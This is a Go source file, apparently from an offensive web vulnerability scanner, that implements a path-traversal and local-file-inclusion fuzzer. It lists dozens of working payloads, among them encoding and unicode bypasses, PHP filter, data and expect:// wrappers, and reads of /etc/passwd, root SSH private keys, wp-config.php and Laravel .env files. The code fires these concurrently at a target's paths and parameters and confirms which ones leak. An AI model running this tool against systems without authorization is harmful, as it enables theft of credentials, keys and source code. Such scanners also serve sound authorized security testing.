package vulns

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

// TraversalPayload defines a specific LFI payload and what to look for
type TraversalPayload struct {
	Name     string
	Payload  string
	Check    string // String to look for in response (e.g. "root:x:", "[extensions]")
	Platform string // "linux", "windows", "all"
}

var LFIPayloads = []TraversalPayload{
	// --- Linux Basic ---
	{"LFI Basic (Linux)", "../../../../../../../../etc/passwd", "root:x:", "linux"},
	{"LFI Root (Linux)", "/etc/passwd", "root:x:", "linux"},

	// --- Windows Basic ---
	{"LFI Basic (Windows)", "../../../../../../../../windows/win.ini", "[fonts]", "windows"},
	{"LFI Basic (Windows Alt)", "../../../../../../../../winnt/win.ini", "[fonts]", "windows"},

	// --- Encoding Bypasses ---
	{"LFI URL Encoded", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:", "linux"},
	{"LFI Double URL Encoded", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:x:", "linux"},
	{"LFI Unicode", "%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", "root:x:", "linux"},
	{"LFI Overlong UTF8", "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:x:", "linux"},

	// --- Filter Bypasses ---
	{"LFI Mangled Path", "..././..././..././..././etc/passwd", "root:x:", "linux"},
	{"LFI Mangled Path 2", "....//....//....//....//etc/passwd", "root:x:", "linux"},
	{"LFI Reverse Proxy Bypass (Tomcat/Nginx)", "..;/..;/..;/..;/etc/passwd", "root:x:", "linux"},

	// --- Unicode Normalization Bypasses ---
	{"LFI Unicode (Two Dot Leader)", "‥/‥/‥/‥/‥/‥/‥/etc/passwd", "root:x:", "linux"},           // U+2025 -> ..
	{"LFI Unicode (Vertical Two Dot)", "︰/︰/︰/︰/︰/︰/︰/etc/passwd", "root:x:", "linux"},         // U+FE30 -> ..
	{"LFI Unicode (Fullwidth Solidus)", "..／..／..／..／..／..／..／etc／passwd", "root:x:", "linux"}, // U+FF0F -> /

	// --- DOUBLE ENCODED (BUG BOUNTY TIP) ---
	{"LFI Double Encoded Dots", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:", "linux"},
	{"LFI Encoded Traversal via index.php (.env)", "index.php/%2e%2e/%2e%2e/.env", "APP_KEY=", "all"},
	{"LFI Double Encoded Dots (Laravel/.env)", "%2e%2e/%2e%2e/%2e%2e/.env", "APP_KEY=", "all"},

	// --- Wrappers & Protocols ---
	// We prepend ?file= to wrappers because they are typically injected into parameters,
	// and putting them in the raw path often breaks HTTP clients/servers.
	{"LFI PHP Filter (Base64)", "?file=php://filter/convert.base64-encode/resource=index.php", "PD9", "all"},               // Base64 header for <?
	{"LFI PHP Filter (ROT13)", "?file=php://filter/read=string.rot13/resource=index.php", "<?cuc", "all"},                  // rot13(<?php) = <?cuc
	{"LFI Data Wrapper", "?file=data://text/plain;base64,PD9waHAgZWNobyAiQmh5YWt1Z2FuUkNFIjsgPz4=", "BhyakuganRCE", "all"}, // <?php echo "BhyakuganRCE"; ?>
	{"LFI Expect Wrapper", "?file=expect://id", "uid=", "linux"},

	// --- RCE via Log Poisoning Candidates ---
	{"LFI Apache Access Log", "/var/log/apache2/access.log", "Mozilla/5.0", "linux"}, // Just checking if we can read log first
	{"LFI Apache Error Log", "/var/log/apache2/error.log", "PHP Fatal error", "linux"},
	{"LFI Nginx Access Log", "/var/log/nginx/access.log", "Mozilla/5.0", "linux"},
	{"LFI SSH Auth Log", "/var/log/auth.log", "sshd", "linux"},

	// --- Common Web App Files (Source Code Disclosure via Wrapper) ---
	// We use php://filter/convert.base64-encode to read PHP files without executing them
	{"LFI WP Config", "?file=php://filter/convert.base64-encode/resource=wp-config.php", "PD9w", "all"}, // <?php
	{"LFI Joomla Config", "?file=php://filter/convert.base64-encode/resource=configuration.php", "PD9w", "all"},
	{"LFI Drupal Settings", "?file=php://filter/convert.base64-encode/resource=sites/default/settings.php", "PD9w", "all"},
	{"LFI Magento Config", "?file=php://filter/convert.base64-encode/resource=app/etc/local.xml", "PD94", "all"}, // <?xml

	// --- Static Files ---
	{"LFI Robots", "robots.txt", "User-agent:", "all"},
	{"LFI Win.ini", "../../../../../../../windows/win.ini", "[fonts]", "windows"}, // Redundant but explicit
	{"LFI Boot.ini (Windows)", "../../../../../../../boot.ini", "[boot loader]", "windows"},

	// --- Linux System Files (PAAT Selection) ---
	{"LFI Etc Hosts", "/etc/hosts", "127.0.0.1", "linux"},
	{"LFI Proc Net TCP", "/proc/net/tcp", "sl  local_address", "linux"},
	{"LFI Proc Sched Debug", "/proc/sched_debug", "runnable tasks:", "linux"},
	{"LFI SSH Key (User)", "../../../../../../../home/user/.ssh/id_rsa", "OPENSSH PRIVATE KEY", "linux"}, // Common guess
	{"LFI SSH Key (Root)", "../../../../../../../root/.ssh/id_rsa", "OPENSSH PRIVATE KEY", "linux"},

	// --- Server Configs ---
	{"LFI Apache Config", "/etc/httpd/conf/httpd.conf", "ServerRoot", "linux"},
	{"LFI Nginx Config", "/etc/nginx/nginx.conf", "worker_processes", "linux"},

	// --- Proc Files ---
	{"LFI Proc Self Environ", "/proc/self/environ", "HTTP_USER_AGENT", "linux"},
	{"LFI Proc Version", "/proc/version", "Linux version", "linux"},
}

// ScanLFI runs the advanced directory traversal fuzzing
func ScanLFI(baseURL string, client *http.Client, onFound func(core.Finding)) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)

	// Collect results
	var results []string
	var highestSeverity string = "Medium"
	var mu sync.Mutex
	baselineBody := ""
	bReq, errBReq := http.NewRequest("GET", baseURL, nil)
	if errBReq == nil {
		utils.SetDefaultHeaders(bReq, baseURL)
		if bResp, bErr := client.Do(bReq); bErr == nil {
			bBody, _ := io.ReadAll(io.LimitReader(io.LimitReader(bResp.Body, 5*1024*1024), 5*1024*1024))
			bResp.Body.Close()
			baselineBody = strings.ToLower(string(bBody))
		}
	}

	// Parse URL to identify parameters for fuzzing
	u, _ := url.Parse(baseURL)
	q := u.Query()

	for _, p := range LFIPayloads {
		// 1. Path-based Testing
		wg.Add(1)
		go func(payload TraversalPayload) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			target := baseURL
			// If it's a file path with params, we shouldn't add a slash before payload if payload is a path.
			// Actually, path-based LFI usually appends to the directory.
			if !strings.HasSuffix(target, "/") && !strings.Contains(target, "?") {
				target += "/"
			}
			target += payload.Payload

			checkLFIVector(target, payload, client, baselineBody, &results, &highestSeverity, &mu)
		}(p)

		// 2. Parameter-based Fuzzing (if params exist)
		if len(q) > 0 {
			for param := range q {
				wg.Add(1)
				go func(payload TraversalPayload, paramName string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					// Clone query to avoid race conditions
					fuzzU, _ := url.Parse(baseURL)
					fuzzQ := fuzzU.Query()
					fuzzQ.Set(paramName, payload.Payload)
					fuzzU.RawQuery = fuzzQ.Encode()

					checkLFIVector(fuzzU.String(), payload, client, baselineBody, &results, &highestSeverity, &mu)
				}(p, param)
			}
		} else {
			// Try common parameters even if not present (?file=, ?page=, etc.)
			commonParams := []string{"file", "page", "path", "doc", "folder"}
			for _, cp := range commonParams {
				wg.Add(1)
				go func(payload TraversalPayload, paramName string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					fuzzU, _ := url.Parse(baseURL)
					fuzzQ := fuzzU.Query()
					fuzzQ.Set(paramName, payload.Payload)
					fuzzU.RawQuery = fuzzQ.Encode()

					checkLFIVector(fuzzU.String(), payload, client, baselineBody, &results, &highestSeverity, &mu)
				}(p, cp)
			}
		}
	}
	wg.Wait()

	if len(results) > 0 {
		fmt.Printf("[!] LFI CONFIRMED at %s (Impacts: %d)\n", baseURL, len(results))
		onFound(core.Finding{
			Type:       "Local File Inclusion (LFI)",
			Target:     baseURL,
			Detail:     fmt.Sprintf("LFI vulnerability detected. Impacted resources:\n- %s", strings.Join(results, "\n- ")),
			Severity:   highestSeverity,
			Confidence: "confirmed",
		})
	}
}

func checkLFIVector(target string, payload TraversalPayload, client *http.Client, baselineBody string, results *[]string, highestSeverity *string, mu *sync.Mutex) {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return
	}
	utils.SetDefaultHeaders(req, target)
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	if err != nil {
		return
	}
	bodyStr := string(body)
	bodyLower := strings.ToLower(bodyStr)
	if baselineBody != "" && strings.Contains(baselineBody, strings.ToLower(payload.Check)) {
		return
	}

	isTraversal := isTraversalPayload(payload.Payload)

	if strings.Contains(bodyStr, payload.Check) {
		if payload.Check == "APP_KEY=" && !looksLikeEnvLeak(bodyStr) {
			return
		}

		// Weak indicator often appears in normal web content.
		if payload.Check == "127.0.0.1" {
			hostsRe := regexp.MustCompile(`(?mi)^127\.0\.0\.1\s+localhost`)
			if !hostsRe.MatchString(bodyStr) {
				return
			}
		}
		// --- REFLECTION CHECK (Anti-FP) ---
		// If the indicator we found is actually part of our payload and reflected in the body,
		// it might just be an error message reflecting our input.
		if strings.Contains(target, payload.Check) && strings.Count(bodyStr, payload.Check) == 1 {
			// If it only appears once and it's in our URL, it's likely a reflection
			return
		}

		// Base64 Logic
		if strings.Contains(payload.Payload, "base64-encode") {
			re := regexp.MustCompile(`[a-zA-Z0-9+/=]{20,}`)
			matches := re.FindAllString(bodyStr, -1)

			verified := false
			decodedSnippet := ""

			for _, m := range matches {
				if strings.Contains(m, payload.Check) {
					decoded, err := base64.StdEncoding.DecodeString(m)
					if err == nil {
						decStr := string(decoded)
						if strings.Contains(decStr, "<?php") ||
							strings.Contains(decStr, "$db") ||
							strings.Contains(decStr, "define(") ||
							strings.Contains(decStr, "class ") ||
							strings.Contains(decStr, "return array") {
							verified = true
							decodedSnippet = decStr
							if len(decodedSnippet) > 50 {
								decodedSnippet = decodedSnippet[:50] + "..."
							}
							break
						}
					}
				}
			}

			mu.Lock()
			if verified {
				*results = append(*results, fmt.Sprintf("Source Disclosure (%s) - Decoded: %s", payload.Name, decodedSnippet))
				*highestSeverity = "Critical"
			}
			mu.Unlock()
			return
		}

		// Standard LFI Logic
		if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") || payload.Check == "APP_KEY=" {
			if strings.Contains(bodyLower, "<html") && payload.Check != "root:x:" && payload.Check != "OPENSSH PRIVATE KEY" && payload.Check != "[fonts]" {
				return
			}
			mu.Lock()
			if payload.Check == "APP_KEY=" {
				*results = append(*results, fmt.Sprintf("Sensitive Information Disclosure (Path Traversal) (%s) - Leaked .env markers: APP_KEY + DB/APP config", payload.Name))
			} else {
				*results = append(*results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
			}
			*highestSeverity = "Critical"
			mu.Unlock()
		}
	}
}

func isTraversalPayload(payload string) bool {
	p := strings.ToLower(payload)
	indicators := []string{
		"..",
		"%2e%2e",
		"%252e%252e",
		"%u002e%u002e",
		"%c0%ae",
		"..;",
		"‥/",
		"︰/",
		"／",
		"://",
	}
	for _, s := range indicators {
		if strings.Contains(p, s) {
			return true
		}
	}
	return false
}

func looksLikeEnvLeak(body string) bool {
	lower := strings.ToLower(body)
	if !strings.Contains(lower, "app_key=") {
		return false
	}

	secondary := []string{
		"app_env=",
		"db_host=",
		"db_database=",
		"db_username=",
		"db_password=",
		"mail_host=",
		"redis_host=",
	}
	for _, m := range secondary {
		if strings.Contains(lower, m) {
			return true
		}
	}
	return false
}
